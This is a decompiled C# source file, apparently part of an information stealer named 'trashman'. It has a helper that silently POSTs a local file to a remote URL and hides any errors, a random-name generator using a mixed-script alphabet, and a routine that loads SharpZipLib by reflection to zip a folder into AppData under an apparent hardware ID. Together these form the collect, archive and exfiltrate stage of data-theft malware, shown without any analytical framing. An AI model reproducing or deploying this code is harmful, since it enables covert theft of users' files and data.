using System;
using System.Linq;
using System.Net;
using System.Reflection;

namespace trashman
{
	// Token: 0x0200000F RID: 15
	public static class trash
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00003E74 File Offset: 0x00002074
		public static void s3nder(string url, string path)
		{
			try
			{
				new WebClient().UploadFile(url, "POST", path);
			}
			catch
			{
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003EB0 File Offset: 0x000020B0
		public static string rndname(int length)
		{
			string result;
			try
			{
				Random rnd = new Random();
				result = new string((from s in Enumerable.Repeat<string>("AB你DEF好HIJKLMNOPQR你好嗎VWXYZ0123456789", length)
				select s[rnd.Next(s.Length)]).ToArray<char>());
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003F10 File Offset: 0x00002110
		public static void Zip(string hwd, string dllpath, string defpath)
		{
			Assembly assembly = Assembly.LoadFrom(dllpath + "/ICSharpCode.SharpZipLib.dll");
			Type type = assembly.GetType("ICSharpCode.SharpZipLib.Zip.FastZip");
			object obj = Activator.CreateInstance(type);
			Type[] types = new Type[]
			{
				typeof(string),
				typeof(string),
				typeof(bool),
				typeof(string)
			};
			MethodInfo method = type.GetMethod("CreateZip", types);
			object[] parameters = new object[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/" + hwd + ".zip",
				defpath,
				true,
				""
			};
			method.Invoke(obj, parameters);
		}
	}
}
